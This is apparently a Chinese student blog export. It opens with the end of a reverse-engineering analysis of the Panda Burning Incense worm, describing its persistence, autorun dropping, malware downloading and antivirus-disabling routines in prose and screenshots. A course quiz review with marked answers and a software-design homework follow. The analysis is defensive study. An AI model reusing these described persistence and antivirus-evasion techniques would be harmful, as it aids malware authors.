<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/WechatIMG337.jpg" alt="WechatIMG337"></p>
<p>首先是40A5B0函数，进入后发现：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/WechatIMG338.jpg" alt="WechatIMG338"></p>
<p>在进入40A48C函数，根据之前的判断，这里应该是在创建Desktop.ini文件。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/WechatIMG340.jpg" alt="WechatIMG340"></p>
<p>然后是40C374函数：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/WechatIMG341.jpg" alt="WechatIMG341"></p>
<p>进入TimerFunc函数中，实际功能就是检查C盘中setup.exe和autorun.inf文件是否存在，若不存在则创建。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/WechatIMG342.jpg" alt="WechatIMG342"></p>
<p>最后是40BACC函数，进入后再进入sub_40B864函数发现是与网络连接相关的一些函数。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/WechatIMG344.jpg" alt="WechatIMG344"></p>
<p><strong>汇总</strong></p>
<ul>
<li>sub_40A5B0：创建线程，遍历目录创建Desktop_.ini文件；</li>
<li>sub_403C74：设置函数定时器，检查C盘中setup.exe和autorun.inf文件是否存在，如果不存在就创建；</li>
<li>sub_40BACC：创建线程，进行网络连接；</li>
</ul>
<h4 id="3-sub-40D088函数分析"><a href="#3-sub-40D088函数分析" class="headerlink" title="3. sub_40D088函数分析"></a>3. sub_40D088函数分析</h4><p>进入后是这个样子：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/WechatIMG345.jpg" alt="WechatIMG345"></p>
<p>先进入40CEE4函数，发现是添加启动项、修改注册表的操作。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/WechatIMG346.jpg" alt="WechatIMG346"></p>
<p>进入sub_40D040函数，再进入sub_40CC34，再进入sub_40C9B0，结合网络博客发现这里在访问网站并获取系统目录，应该是从服务器下载恶意代码。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/WechatIMG347.jpg" alt="WechatIMG347"></p>
<p>再进入40D048函数，发现内部有两个函数，函数sub_40CC34与函数sub_40CDEC：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/WechatIMG348.jpg" alt="WechatIMG348"></p>
<p>40CC34函数与40D040函数功能相同，也是下载恶意代码，40CDEC函数方面，发现其为执行cmd命令，关闭网络共享。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/WechatIMG349.jpg" alt="WechatIMG349"></p>
<p>进入sub_407430函数，再进入sub_406E44函数，发现熟悉的McAfree，用于删除杀毒软件启动项、关闭杀毒软件服务的操作：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/WechatIMG350.jpg" alt="WechatIMG350"></p>
<p>进入sub_40CC4C函数，结合网上博客，这个函数是用于打开解密之后的网页：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/WechatIMG351.jpg" alt="WechatIMG351"></p>
<p>进入sub_40C728函数，再进入sub_40C5E0函数，结合博客，发现与sub_40D040功能类似，此处函数功能大概也是下载恶意代码。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/WechatIMG352.jpg" alt="WechatIMG352"></p>
<p><strong>汇总</strong></p>
<ul>
<li>sub_40CEE4：关闭杀软窗口和进程，添加启动项、修改注册表</li>
<li>sub_40D040：下载恶意代码</li>
<li>sub_40D048：下载恶意代码，执行cmd命令</li>
<li>sub_407430：删除杀毒软件启动项，关闭杀软服务</li>
<li>sub_40CC4C：打开解密之后的网页</li>
<li>sub_40C728：下载恶意代码</li>
</ul>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://holger-zh.notion.site/5-342-13-fd7ba5e649e140538636e33c25d6a061">5: 熊猫烧香病毒分析</a></p>
<p><a href="https://www.52pojie.cn/thread-1569939-1-1.html">经典病毒分析——熊猫烧香 - 吾爱破解 - 52pojie.cn</a></p>
<p><a href="https://blog.csdn.net/datouyu0824/article/details/115032961">熊猫烧香病毒分析</a></p>
]]></content>
      <categories>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>软件安全</tag>
        <tag>windows xp</tag>
        <tag>vmware</tag>
        <tag>ollyDbg</tag>
        <tag>IDA</tag>
        <tag>病毒分析</tag>
        <tag>PEID</tag>
        <tag>火绒剑</tag>
      </tags>
  </entry>
  <entry>
    <title>软件工程管理2024 课堂小测整理</title>
    <url>/2025/01/07/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E7%AE%A1%E7%90%86-%E8%AF%BE%E5%A0%82%E5%B0%8F%E6%B5%8B%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<h1 id="没有银弹"><a href="#没有银弹" class="headerlink" title="没有银弹"></a>没有银弹</h1><ol>
<li><p>在《没有银弹》中，Brooks主张：</p>
<ul>
<li><p>存在能够显著提高软件生产力的技术</p>
</li>
<li><p><strong>软件开发的主要困难是复杂度、一致性、变化性和不可见性</strong></p>
</li>
<li><p>通过采用新的编程语言，软件危机可以完全得到解决。</p>
</li>
<li><p>大多数的软件开发问题都是由于使用了错误的工具。</p>
</li>
</ul>
</li>
<li><p>《没有银弹》文章中提到的“银弹”是指：</p>
<ul>
<li>一种新的编程语言。</li>
<li>一种新的软件开发方法。</li>
<li>一种新的软件工具。</li>
<li><strong>一个具有魔法般效果的解决方案。</strong></li>
</ul>
</li>
</ol>
<span id="more"></span>

<ol start="3">
<li><p>根据《没有银弹》的观点，下列哪个因素被认为不是造成软件危机的直接原因?</p>
<ul>
<li>软件开发周期的增长</li>
<li>软件的复杂性和变化性</li>
<li><strong>新技术的快速迭代</strong></li>
<li>人力成本的提高</li>
</ul>
</li>
<li><p>.Brooks提到，即使解决了所有的偶然困难，软件的什么困难仍然会存在?</p>
<ul>
<li><strong>软件的复杂性</strong></li>
<li>软件的可靠性</li>
<li>软件的维护性</li>
<li>软件的开发速度</li>
</ul>
</li>
<li><p>在讨论软件的本质复杂性时，Brooks强调了软件系统的哪种属性?</p>
<ul>
<li>其可以被多次复制而不产生额外成本</li>
<li>其通常与硬件紧密结合</li>
<li><strong>其设计不能简化，而只能被概念化</strong></li>
<li>其经常需要进行大量的维护和修改</li>
</ul>
</li>
<li><p>你的团队在开发一个大型的在线银行系统。这个系统需要处理数百万用户的交易和查询，同时保证数据的安全<br>性、准确性和实时性。为了应对这一挑战，你的团队已经采用了最新的编程语言、最先进的数据库技术和高效<br>的算法。但即使如此，开发进度仍然迟缓，而且出现了很多不可预见的问题。</p>
<p>请问，根据Brooks的《没有银弹》,这种情况的主要原因可能是什么?</p>
<ul>
<li>因为团队采用了错误的技术和工具。</li>
<li><strong>大型软件项目固有的本质复杂性使得问题的解决和管理变得困难。</strong></li>
<li>团队中的开发者缺乏必要的技能和经验，</li>
<li>在线银行系统的用户需求太多，使得开发困难。</li>
</ul>
</li>
<li><p>您是一家软件公司的CTO，正在考虑采用新技术来改进软件开发过程。您的团队成员将Brooks的《没有银弹》提出的观点引入了讨论。您的团队成员表示，他们认为通过引入最新的编程语言可以显著提高生产力。根据Brooks的论文，以下哪项最能反映他的观点?</p>
<ul>
<li>新技术将使软件开发速度提高一个数量级。</li>
<li><strong>尽管新技术可能提供一些提高，但不会根本性地解决软件复杂性问题。</strong></li>
<li>新技术永远不会带来任何实质性的进步，</li>
<li>新技术总是值得追求的。</li>
</ul>
</li>
<li><p>数字创新公司正在开发一个全新的电商平台。由于市场的快速变化和用户需求的多样性，该平台需要频繁地进<br>行迭代和更新。公司的开发团队为了满足这些变化，决定采用一种被广泛推崇的新编程语言，希望它能简化代<br>码的修改和扩展。然而，尽管新语言确实为团队提供了一些便利，但在应对频繁变化的需求时，团队仍然面临<br>着巨大的挑战。</p>
<p>请问，根据Brooks的《没有银弹》,这种情况的最可能的解释是什么?</p>
<ul>
<li>新编程语言并不适合开发电商平台。</li>
<li>开发团队没有充分利用新编程语言的特性。</li>
<li><strong>软件的可变性是其本质特性之一，即使采用新的编程语言，也无法完全消除与之相关的复杂性。</strong></li>
<li>团队中的开发者对新编程语言的掌握程度不足。</li>
</ul>
</li>
<li><p>星辰科技公司正在开发一款复杂的数据分析软件，旨在帮助商业用户更好地理解他们的销售数据。为了确保产<br>品的质量，公司进行了多轮的内部审查。然而，在审查过程中，许多决策者发现很难理解软件的内部逻辑和数<br>据处理机制，尽管开发团队提供了详细的文档和解释。</p>
<p>请问，根据Brooks的《没有银弹》，这种情况最可能的原因是什么?</p>
<ul>
<li>开发团队的文档撰写技能不佳，导致解释不够清晰。</li>
<li>决策者们缺乏足够的技术背景，因此难以理解软件细节。</li>
<li><strong>软件本身的不可见性导致其结构、行为和复杂性难以通过传统的方式(如文档或图表)完全传达。</strong></li>
<li>数据分析软件本身太过复杂，即使是专家也难以完全理解。</li>
</ul>
</li>
<li><p>网络魔法公司正在开发一款云端的软件开发平台。为了简化代码编写过程，他们决定集成一种基于大语言模型<br>(类似ChatGPT)的代码生成工具，允许开发者通过自然语言描述需求来自动生成代码。初步测试表明，该工具<br>可以准确地生成简单的代码片段，节省了开发时间。然而，在项目实施中，开发团队发现大型项目中仍然需要<br>大量的手工编码，并且需要经常调整和优化由工具生成的代码。这种情况的最可能的解释是什么?</p>
<ul>
<li>ChatGPT的技术还不够成熟，不能满足实际开发需求。</li>
<li><strong>软件工程的本质复杂性决定了无法通过自动化工具完全替代人的创造性和决策。</strong></li>
<li>网络魔法公司的开发团队没有充分利用工具的特性。</li>
<li>自动化代码生成工具在定义需求时需要更严格的自然语言描述。</li>
</ul>
</li>
</ol>
<h1 id="大教堂与集市"><a href="#大教堂与集市" class="headerlink" title="大教堂与集市"></a>大教堂与集市</h1><ol>
<li>《大教堂与市集》中，哪种开发模式是基于严格的集中控制和封闭性的?<ul>
<li><strong>大教堂式</strong></li>
<li>市集式</li>
<li>两者都是</li>
<li>两者都不是</li>
</ul>
</li>
<li>在市集式开发模式中，哪个因素被认为是软件质量高和错误迅速被检测出的主要原因?<ul>
<li>有严格的代码审查机制</li>
<li>开发者数量众多</li>
<li><strong>‘多眼睛原则“或“给足够多的眼睛看，所有的问题都显而易见”</strong></li>
<li>开发者通常是专业的</li>
</ul>
</li>
<li>.为什么开源软件往往被认为能够更快地适应变化和需求?<ul>
<li>因为它们有大量的财务支持</li>
<li>因为它们的开发者更有经验</li>
<li><strong>因为开源社区可以迅速吸纳反馈并进行修改</strong></li>
<li>因为它们通常使用更高效的编程语言</li>
</ul>
</li>
<li>《大教堂与市集》中提到，开源软件的一个主要优势是什么?<ul>
<li>免费</li>
<li>无需进行严格的质量检查</li>
<li>能够更好地进行商业化利用</li>
<li><strong>社区驱动，能够吸纳大量的用户反馈和贡献</strong></li>
</ul>
</li>
<li>.在《大教堂与市集》中，以下哪个观点与市集式开发不符?<ul>
<li>更快速的迭代会导致更好的软件</li>
<li>软件的复杂性应当被一个核心团队管理</li>
<li>用户是最好的测试员</li>
<li><strong>任何问题在发布前都应被固定的开发团队解决</strong></li>
</ul>
</li>
<li>根据《大教堂与市集》，开源的成功与否与哪个因素最不相关?<ul>
<li>一个活跃的贡献者社区</li>
<li>软件的原始设计质量</li>
<li><strong>项目的广告和推广策略</strong></li>
<li>早期和频繁的发布</li>
</ul>
</li>
<li>在市集模式中，为什么认为“失败是成功之母”?<ul>
<li>因为失败会增加开发者的经验</li>
<li><strong>因为市集模式鼓励快速失败以尽早找到错误</strong></li>
<li>因为所有的软件都是完美的，不会失败</li>
<li>因为市集模式依赖于高质量的代码审查</li>
</ul>
</li>
<li>根据《大教堂与市集》，哪种策略不太可能增强一个开源项目的生态系统?<ul>
<li>提高代码的可读性</li>
<li><strong>限制外部贡献者的访问</strong></li>
<li>鼓励社区的反馈</li>
<li>早期和频繁的发布</li>
</ul>
</li>
<li>在《大教堂与市集》中，哪项不是大教堂模式的典型特征?<ul>
<li>长时间的发布周期</li>
<li>高度的结构和组织</li>
<li><strong>社区驱动的开发</strong></li>
<li>由一个核心团队完全控制</li>
</ul>
</li>
<li>公司XYZ正在决策关于他们新软件项目的开发方法。他们正在考虑“大教堂“式的开发(集中、封闭、由一个固定<br>的团队来开发)和“市集“式的开发(开放、协作、来自社区的贡献)。根据《大教堂与市集》的描述，哪种开发<br>方法更可能鼓励来自全球的开发者参与?<ul>
<li>大教堂式</li>
<li><strong>市集式</strong></li>
<li>两者都不鼓励</li>
<li>两者都鼓励</li>
</ul>
</li>
</ol>
<h1 id="Characterizing-the-Software-Process"><a href="#Characterizing-the-Software-Process" class="headerlink" title="Characterizing the Software Process"></a>Characterizing the Software Process</h1><ol>
<li>SEI的成熟度框架如何帮助不同的软件开发组织之间进行比较?<ul>
<li>通过提供一个统一的工资和福利标准</li>
<li>通过为每个组织分配一个绩效排名</li>
<li><strong>通过定义一个共同的过程成熟度量级</strong></li>
<li>通过制定统一的软件开发技术标准</li>
</ul>
</li>
<li>Humphrey 描述了一个软件过程成熟度的框架，该框架用于评估和改进软件开发过程。在这个框架中，哪一级强调了对项目管理和过程控制的正式化?<ul>
<li>初始级别</li>
<li>可重复级别</li>
<li><strong>已定义级别</strong></li>
<li>已管理级别</li>
</ul>
</li>
<li>根据Humphrey关于软件过程改进的观点，哪种方法能最有效地启动过程改进活动?<ul>
<li>从引入新的开发工具开始</li>
<li>通过管理层的强制命令</li>
<li>通过底层员工的草根努力</li>
<li><strong>通过全面评估当前过程并确定改进点</strong></li>
</ul>
</li>
</ol>
<h1 id="Scrum"><a href="#Scrum" class="headerlink" title="Scrum"></a>Scrum</h1><ol>
<li>Scrum中，产品负责人(Product Owner)的主要责任是什么?<ul>
<li>编写代码</li>
<li>测试软件</li>
<li><strong>最大化产品价值</strong></li>
<li>管理团队成员</li>
</ul>
</li>
<li>Scrum框架中的三个主要角色是什么?<ul>
<li>产品负责人、Scrum Master、客户</li>
<li><strong>产品负责人、Scrum Master、团队</strong></li>
<li>项目经理、开发者、测试人员</li>
<li>设计师、分析师、编程员</li>
</ul>
</li>
<li>在Scrum中，一个Sprint通常持续多长时间？<ul>
<li>1-2天</li>
<li><strong>1-4周</strong></li>
<li>3-6个月</li>
<li>1年</li>
</ul>
</li>
<li>Scrum框架中，哪个角色负责移除开发过程中的障碍?<ul>
<li>产品负责人</li>
<li><strong>Scrum Master</strong></li>
<li>团队成员</li>
<li>客户</li>
</ul>
</li>
<li>Scrum中的“猪“和“鸡”的比喻指的是什么?<ul>
<li>猪是项目的负责人，而鸡是团队成员</li>
<li><strong>猪是团队成员，而鸡是不参与项目决策的人</strong></li>
<li>猪指的是客户，而鸡指的是开发者</li>
<li>猪是Scrum Master，而鸡是产品负责人</li>
</ul>
</li>
<li>用户故事在Scrum中的作用是什么?<ul>
<li>定义项目的最终目标</li>
<li>提供详细的项目需求说明</li>
<li><strong>作为产品功能的简要描述和协作讨论的基础</strong></li>
<li>设计UI&#x2F;UX原型</li>
</ul>
</li>
<li>在Scrum中，什么是Sprint回顾会议的主要目的?<ul>
<li>审查团队成员的工作表现</li>
<li>制定下一个Sprint的计划</li>
<li><strong>讨论并改进团队的工作方式</strong></li>
<li>展示给客户最终产品</li>
</ul>
</li>
<li>Scrum中的每日站会(Daily Scrum)的目的是什么?<ul>
<li>为了报告给管理层</li>
<li>讨论技术问题和解决方案</li>
<li><strong>快速同步团队进展和识别障碍</strong></li>
<li>审批团队的工作时间表</li>
</ul>
</li>
<li>.背景:在一个软件开发项目中，团队正在使用Scrum框架。产品负责人提出了以下用户故事:”作为一个手机应用用户，我希望应用能够根据我的位置显示附近的餐馆，以便我可以快速找到就餐地点。“<br>根据3C原则(Card,Conversation,Confirmation)，哪个选项最准确地描述了对这个用户故事的处理?<ul>
<li>Card:在卡片上写下用户故事，团队成员不需要进行进一步的沟通，直接开始开发</li>
<li>Conversation:团队成员与产品负责人进行简短会谈，确认功能的技术细节，然后开始编码。</li>
<li>Confirmation: 团队确定了一个清晰的验收标准，即用户能够看到他们周围一英里内的所有餐馆。</li>
<li><strong>Card, Conversation,Confirmation:首先将用户故事简明地记录在卡片上。然后，团队与产品负责人进行深入的讨论，以理解和细化需求。最后，共同定义清晰的验收标准，比如用户能够看到周围特定距离内的餐馆，且应用能够根据不同位置更新这些信息。</strong></li>
</ul>
</li>
<li>在Scrum框架中，一个团队正在进行User Story Mapping以规划他们的产品开发。关于User Story Mapping的正确描述是哪一项?<ul>
<li>User Story Mapping主要用于跟踪项目的进度，确保按时完成每个Sprint的目标</li>
<li>User Story Mapping是一个动态过程，主要关注于定义和优先排序技术任务和bug修复。</li>
<li>在User Story Mapping中，团队将用户故事按照功能的技术复杂度排序，以优化开发流程</li>
<li><strong>User Story Mapping涉及创建一个可视化地图，展示用户故事按照它们在用户需求中不同抽象层级的排列，帮助团队理解产品如何满足用户需求。</strong></li>
</ul>
</li>
<li>背景：假设你是一个使用Scrum框架的软件开发团队的成员。团队正在准备进行Sprint计划会议，需要对几个新<br>的用户故事进行估算。团队决定使用扑克牌估算法来进行用户故事：<br>1.“作为一个社交媒体应用的用户，我希望能够通过我的个人资料页直接上传和编辑我的头像。<br>2.“作为网站的管理员，我需要一个报告系统，以便追踪和分析用户的活动数据。<br>问题：在使用扑克牌估算法进行估算时，团队成员的估算结果分别为:3,5,8,13,3,5。接下来团队应如何处理这<br>种估算结果?<ul>
<li>接受最高的估算值(13)，因为它考虑到了潜在的风险和不确定性。</li>
<li>选择中间值(5)，作为折中的估算结果，</li>
<li><strong>组织一轮讨论，让给出高估算和低估算的成员解释他们的理由，然后进行第二轮估算。</strong></li>
<li>忽略最高和最低的估算值，只考虑其它估算值</li>
</ul>
</li>
</ol>
<h1 id="XP极限编程"><a href="#XP极限编程" class="headerlink" title="XP极限编程"></a>XP极限编程</h1><ol>
<li>XP开发过程中的“开发阶段”(Development Episode)指的是什么?<ul>
<li>系统集成</li>
<li>用户管理</li>
<li><strong>程序员实现工程任务并与系统其他部分集成</strong></li>
<li>对软件进行测试</li>
</ul>
</li>
<li>在XP的“开发阶段”，以下哪项是必须的?<ul>
<li>独立编程</li>
<li><strong>结对编程</strong></li>
<li>每小时完成一次编码</li>
<li>每天更换编程伙伴</li>
</ul>
</li>
<li>.XP开发中测试的作用是什么?<ul>
<li>仅用于最终验收</li>
<li><strong>驱动开发</strong></li>
<li>评估性能</li>
<li>文档记录</li>
</ul>
</li>
<li>在XP开发中，关于变更成本的假设是什么?<ul>
<li><strong>变更成本随时间呈线性增长</strong></li>
<li>变更成本随时间呈指数增长</li>
<li>变更成本随时间先增后减</li>
<li>变更成本保持不变</li>
</ul>
</li>
<li>在XP中，如果变更成本较低，应该如何处理决策?<ul>
<li>尽早做出重大决策</li>
<li><strong>延迟做出重大决策</strong></li>
<li>避免任何决策</li>
<li>随时做出决策</li>
</ul>
</li>
<li>XP实践中强调的四个核心价值观包括以下哪些?<ul>
<li>效率、透明性、创新、尊重</li>
<li><strong>沟通、简单性、反馈、勇气</strong></li>
<li>速度、质量、灵活性、团队合作</li>
<li>规划、执行、监控、调整</li>
</ul>
</li>
<li>XP实践中，哪项技术被认为是降低变更成本的关键?<ul>
<li>数据库优化</li>
<li>云计算</li>
<li>大模型技术</li>
<li><strong>面向对象技术</strong></li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>软件工程管理</category>
      </categories>
      <tags>
        <tag>期末复习</tag>
        <tag>软件工程管理</tag>
      </tags>
  </entry>
  <entry>
    <title>软件系统设计-作业1</title>
    <url>/2024/12/15/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1-%E4%BD%9C%E4%B8%9A1/</url>
    <content><![CDATA[<h3 id="作业要求"><a href="#作业要求" class="headerlink" title="作业要求"></a>作业要求</h3><p><a href="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/pdf/assignment-1.pdf">https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/pdf/assignment-1.pdf</a></p>
<h3 id="Task1-Quality-Attribute-Scenarios"><a href="#Task1-Quality-Attribute-Scenarios" class="headerlink" title="Task1: Quality Attribute Scenarios"></a>Task1: Quality Attribute Scenarios</h3><h4 id="Extensibility（可扩展性）-vs-Maintainability（可维护性）"><a href="#Extensibility（可扩展性）-vs-Maintainability（可维护性）" class="headerlink" title="Extensibility（可扩展性） vs. Maintainability（可维护性）"></a>Extensibility（可扩展性） vs. Maintainability（可维护性）</h4><h5 id="1-Extensibility-可扩展性通用方案与具体方案"><a href="#1-Extensibility-可扩展性通用方案与具体方案" class="headerlink" title="1. Extensibility 可扩展性通用方案与具体方案"></a>1. Extensibility 可扩展性通用方案与具体方案</h5><table>
<thead>
<tr>
<th>Portion of Scenario</th>
<th>Possible Values</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Source</strong></td>
<td>用户、开发者、管理员</td>
</tr>
<tr>
<td><strong>Stimulus</strong></td>
<td>需要在现有系统的基础上添加新的功能或改进现有功能，系统需要满足新的需求和环境变化；</td>
</tr>
<tr>
<td><strong>Stimulus Artifact</strong></td>
<td>代码、接口、组件、模块</td>
</tr>
<tr>
<td><strong>Environment</strong></td>
<td>新的功能需求；新的技术环境；新的操作系统；新的硬件设备</td>
</tr>
<tr>
<td><strong>Response</strong></td>
<td>修改&#x2F;添加现有的代码或新的代码 <br/>添加新的组件或模块<br/>对接口进行改进或添加新的接口</td>
</tr>
<tr>
<td><strong>Response Measure</strong></td>
<td>所需的时间和人力成本<br/>新的代码和现有代码的兼容性<br/>新的组件或模块的兼容性<br/>新的接口或改进后的接口与现有系统的兼容性<br/>新的代码或接口的可测试性</td>
</tr>
</tbody></table>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215210159138.png" alt="image-20241215210159138" style="zoom:67%;" />

<span id="more"></span>

<h5 id="2-Maintainability-可维护性通用方案与具体方案"><a href="#2-Maintainability-可维护性通用方案与具体方案" class="headerlink" title="2. Maintainability 可维护性通用方案与具体方案"></a>2. Maintainability 可维护性通用方案与具体方案</h5><table>
<thead>
<tr>
<th>Portion of Scenario</th>
<th>Possible Values</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Source</strong></td>
<td>用户、开发者、维护者、管理员</td>
</tr>
<tr>
<td><strong>Stimulus</strong></td>
<td>需要对现有系统进行修改或维护以满足新的需求或修复现有问题；</td>
</tr>
<tr>
<td><strong>Stimulus Artifact</strong></td>
<td>代码、文档、测试用例、数据库、配置文件</td>
</tr>
<tr>
<td><strong>Environment</strong></td>
<td>安全漏洞；系统bug；新的运行环境；新的需求</td>
</tr>
<tr>
<td><strong>Response</strong></td>
<td>修复 bug、更新代码、添加新功能 <br/>更新文档、重新设计数据库<br/>测试代码和系统</td>
</tr>
<tr>
<td><strong>Response Measure</strong></td>
<td>所需的时间和人力成本<br/>有百分之多少的代码被修改<br/>修改后的代码、文档、数据库或配置文件与现有系统的兼容性<br/>修改后的系统的可测试性、可维护性、易读性</td>
</tr>
</tbody></table>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215210214801.png" alt="image-20241215210214801" style="zoom:67%;" />



<h4 id="Reliability（可靠性）-vs-Recoverability（可恢复性）"><a href="#Reliability（可靠性）-vs-Recoverability（可恢复性）" class="headerlink" title="Reliability（可靠性） vs. Recoverability（可恢复性）"></a>Reliability（可靠性） vs. Recoverability（可恢复性）</h4><h5 id="1-Reliability-可靠性通用方案与具体方案"><a href="#1-Reliability-可靠性通用方案与具体方案" class="headerlink" title="1. Reliability 可靠性通用方案与具体方案"></a>1. Reliability 可靠性通用方案与具体方案</h5><table>
<thead>
<tr>
<th>Portion of Scenario</th>
<th>Possible Values</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Source</strong></td>
<td>用户、系统</td>
</tr>
<tr>
<td><strong>Stimulus</strong></td>
<td>系统在正常或异常情况下需要始终提供正确的结果或行为；</td>
</tr>
<tr>
<td><strong>Stimulus Artifact</strong></td>
<td>软件、硬件、数据</td>
</tr>
<tr>
<td><strong>Environment</strong></td>
<td>不同的负载；各种输入和操作；不同的操作系统和硬件平台</td>
</tr>
<tr>
<td><strong>Response</strong></td>
<td>系统应该在进行任务时保持一致的行为，并且在所有条件下都能正确地完成其任务<br/> 系统应该具有适当的错误处理和容错能力，以避免或减轻故障的影响<br/>系统应该具有充分的安全性，以保护用户数据和系统资源的机密性、完整性和可用性</td>
</tr>
<tr>
<td><strong>Response Measure</strong></td>
<td>平均无故障时间、故障率、可靠性增长率<br/>异常处理时间、恢复时间<br/>错误率、安全漏洞数量、数据泄露等安全相关指标</td>
</tr>
</tbody></table>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215210229099.png" alt="image-20241215210229099" style="zoom:67%;" />

<h5 id="2-Recoverability-可恢复性通用方案与具体方案"><a href="#2-Recoverability-可恢复性通用方案与具体方案" class="headerlink" title="2. Recoverability 可恢复性通用方案与具体方案"></a>2. Recoverability 可恢复性通用方案与具体方案</h5><table>
<thead>
<tr>
<th>Portion of Scenario</th>
<th>Possible Values</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Source</strong></td>
<td>系统、管理员</td>
</tr>
<tr>
<td><strong>Stimulus</strong></td>
<td>系统需要在发生故障或意外情况时能够快速恢复并最小化损失；</td>
</tr>
<tr>
<td><strong>Stimulus Artifact</strong></td>
<td>软件、硬件、数据</td>
</tr>
<tr>
<td><strong>Environment</strong></td>
<td>各种故障或事故场景，包括硬件故障、软件错误、自然灾害、人为错误等</td>
</tr>
<tr>
<td><strong>Response</strong></td>
<td>系统应该在出现故障或错误时，及时发现问题并进行相应的处理，比如重启系统、自动备份数据等，确保系统尽快恢复正常<br/>系统应该能够检测到和恢复从网络和其他外部资源中发生的错误和故障<br/>系统应该具有充分的备份和恢复机制，以确保在系统故障或崩溃时能够恢复数据和配置</td>
</tr>
<tr>
<td><strong>Response Measure</strong></td>
<td>恢复时间、数据完整性、数据恢复率<br/>系统备份频率、备份完整性、备份恢复时间等备份相关指标<br/>系统可扩展性和可配置性，以便在发生故障时进行系统配置更改</td>
</tr>
</tbody></table>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215210311543.png" alt="image-20241215210311543" style="zoom:67%;" />

<h3 id="Task2-Tactics"><a href="#Task2-Tactics" class="headerlink" title="Task2: Tactics"></a>Task2: Tactics</h3><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215210613760.png" alt="image-20241215210613760"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215210635593.png" alt="image-20241215210635593"></p>
<h3 id="Task3-Quality-Attribute-Debate"><a href="#Task3-Quality-Attribute-Debate" class="headerlink" title="Task3: Quality Attribute Debate"></a><strong>Task3: Quality Attribute Debate</strong></h3><p>可扩展性（Extensibility）、可移植性（Portability）、可测试性（Testability）这三个质量属性与可维护性（Maintainability）有着密切的联系。</p>
<p>可扩展性（Extensibility）是指软件系统的设计和实现，能够方便地添加新的功能或修改现有功能，而不会对系统的整体结构和代码的复杂度产生过大的影响。一个具有高可扩展性的系统可以有效地应对未来的变化和需求，降低后期开发的成本和风险。</p>
<p>一个具有高可扩展性的系统往往比较容易维护，因为在设计和实现过程中，高可扩展性通常需要考虑代码的模块化、分层和接口的规范化，从而使得系统的结构和逻辑更加清晰和易于理解。这样，即使在后续的维护和升级过程中需要修改或扩展系统功能，也能够更加容易地实现，不容易产生副作用或破坏系统的整体稳定性。这些都有利于系统的可维护性。</p>
<p>另一方面，一个具有高可维护性的系统也往往具有较高的可扩展性，因为在设计和实现过程中，高可维护性通常需要考虑代码的可读性、可理解性和可维护性，从而使得系统的结构和逻辑更加清晰和易于维护。这样，即使需要扩展或修改系统功能，也能够更容易地理解和修改代码，从而不容易引入错误或产生副作用。</p>
<p>可移植性（Portability）是指软件系统在不同的硬件和软件环境中能够顺利运行，而不需要修改或重新编写代码。一个具有高可移植性的系统可以在不同的平台上进行部署和使用，增强了系统的灵活性和可用性。</p>
<p>具有高可移植性的软件系统通常更易于维护，因为为了实现可移植性，软件系统往往需要遵循一些通用的编程规范和标准，如使用标准的接口、数据结构、文件格式等等，这些规范和标准使得系统更加易于理解和维护。此外，具有高可移植性的软件系统也更易于调试和测试，因为这些系统可以在不同的平台和环境下运行和测试，从而使得问题更容易被发现和解决。</p>
<p>另一方面，具有高可维护性的软件系统也具有较高的可移植性，因为在设计和实现过程中，高可维护性通常需要考虑代码的可读性、可理解性和可维护性，从而使得代码更加规范和易于维护。这些代码规范和标准也使得代码更加具有可移植性，因为这些规范和标准通常是跨平台和环境的，不会受到特定平台和环境的限制。</p>
<p>可测试性（Testability）是指软件系统的设计和实现，方便进行测试，包括单元测试、集成测试和系统测试等各种测试方法。一个具有高可测试性的系统可以提高测试的效率和准确性，从而降低软件缺陷和错误的风险。当系统需要进行维护和修改时，测试可以帮助开发人员及时发现和修复缺陷，降低维护的成本和风险，提高系统的可维护性。</p>
<p>具有高可测试性的软件系统往往具有较高的可维护性，因为在设计和实现过程中，为了实现可测试性，通常需要将系统分解成较小的模块，并为每个模块编写独立的测试用例。这样可以帮助开发人员更加清晰地了解系统的功能和结构，并能够更容易地找到和解决问题。同时，为了编写有效的测试用例，代码的可读性、可理解性和可维护性也需要得到保证，从而使得代码更易于维护。</p>
